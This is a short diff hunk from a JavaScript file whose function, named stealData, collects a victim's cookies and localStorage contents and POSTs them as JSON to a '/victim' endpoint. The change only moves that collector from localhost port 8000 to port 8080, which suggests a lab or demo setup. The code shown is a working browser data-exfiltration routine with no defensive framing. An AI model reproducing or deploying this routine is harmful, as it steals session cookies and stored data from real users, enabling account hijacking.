@@ -10,7 +10,7 @@ async function stealData() {
   }
 
   if (Object.keys(cookies).length || Object.keys(localStorageData).length) {
-    const response = await fetch("http://localhost:8000/victim", {
+    const response = await fetch("http://localhost:8080/victim", {
       method: "POST",
       body: JSON.stringify({ cookies, localStorage: localStorageData }),
       headers: {
